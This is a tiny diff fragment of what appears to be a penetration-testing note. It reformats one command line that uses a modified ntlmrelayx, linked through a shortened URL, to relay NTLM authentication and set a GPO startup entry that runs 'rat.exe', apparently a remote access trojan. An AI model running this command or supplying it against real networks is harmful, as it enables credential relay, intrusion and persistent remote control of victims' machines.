@@ -10,4 +10,4 @@
 
 ### Using a modified version of ntlmrelayx: https://tinyurl.com/28udqr6s
 
- - ntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe
+    ntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe
